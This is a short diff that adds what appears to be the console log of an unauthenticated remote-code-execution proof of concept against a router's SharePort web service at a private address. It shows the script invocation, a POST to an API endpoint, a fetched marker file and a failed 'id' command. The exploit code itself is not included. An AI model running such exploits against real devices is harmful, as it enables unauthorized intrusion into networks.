@@ -1,0 +1,4 @@
+# python3 poc_shareport_unauth_rce.py --target 192.168.0.1 --cmd 'id'
+[*] POST :8181/dws/api/ListRoot -> 500
+[*] fetched /sp_bwbnnka5iv.txt via TCP/8181
+sh: id: not found
